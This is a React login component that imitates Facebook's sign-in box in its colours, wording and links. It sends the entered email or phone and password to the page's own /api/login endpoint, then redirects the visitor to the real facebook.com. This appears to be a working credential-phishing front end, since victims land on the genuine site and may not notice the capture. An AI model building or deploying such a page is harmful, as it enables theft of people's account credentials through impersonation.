import { useState } from "react";
import styled from "styled-components";

const LogInForm = () => {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  const handleSubmit = async (e) => {
    e.preventDefault();
    const userData = { username, password };

    try {
      const response = await fetch("/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(userData),
      });

      if (response.ok) {
        window.location.href = "https://www.facebook.com";
      } else {
        const errorData = await response.json();
        console.error("Login failed:", errorData.message);
      }
    } catch (error) {
      console.error("Error during fetch:", error);
    }
  };

  return (
    <Main>
      <form onSubmit={handleSubmit}>
        <div className="username">
          <input
            type="text"
            name="username"
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Email address or phone number"
            required
          />
        </div>
        <div className="password">
          <input
            type="password"
            name="password"
            placeholder="Password"
            onChange={(e) => setPassword(e.target.value)}
            required
          />
        </div>
        <button type="submit" id="login-button">
          Log in
        </button>
      </form>
      <div className="forgot">
        <a href="/forgot-password">Forgotten password?</a>
      </div>
      <div className="outline"></div>
      <div className="signUp">
        <a href="/signup">Create new account</a>
      </div>
    </Main>
  );
};

const Main = styled.div`
  display: flex;
  flex-direction: column;
  background: #fff;
  padding: 16px;

  padding-bottom: 24px;
  padding-top: 10px;
  border-radius: 8px;
  box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
  font-family: Helvetica, Arial, sans-serif;
  form {
    display: flex;
    flex-direction: column;
  }
  .username,
  .password {
    font-size: 17px;
    padding: 14px 16px;
    margin: 6px 0;
    border: 1px solid #dddfe2;
    border-radius: 6px;
    color: #1d2129;
    &:focus-within {
      border-color: #0866ff;
      box-shadow: 0 0 0 2px #e7f3ff;
      caret-color: #0866ff;
    }
  }

  #login-button {
    cursor: pointer;
    background-color: #0866ff;
    color: #fff;
    border: none;
    border-radius: 6px;
    font-size: 20px;
    font-weight: 600;
    line-height: 48px;
    padding: 0 16px;
    margin-top: 6px;
  }
  .forgot {
    margin-top: 16px;
    text-align: center;
    font-size: 14px;
    a {
      color: #0866ff;
      text-decoration: none;
      &:hover {
        text-decoration: underline;
      }
    }
  }
  .outline {
    border-bottom: 1px solid #dadde1;
    margin: 20px 16px;
  }
  .signUp {
    padding-top: 6px;
    width: 100%;
    display: flex;
    justify-content: center;
    align-items: center;
    a {
      cursor: pointer;
      text-decoration: none;
      white-space: nowrap;
      border-radius: 6px;
      padding: 0 16px;
      background-color: #42b72a;
      color: #fff;
      font-size: 17px;
      line-height: 48px;
      font-weight: bold;
    }
  }
`;
export default LogInForm;
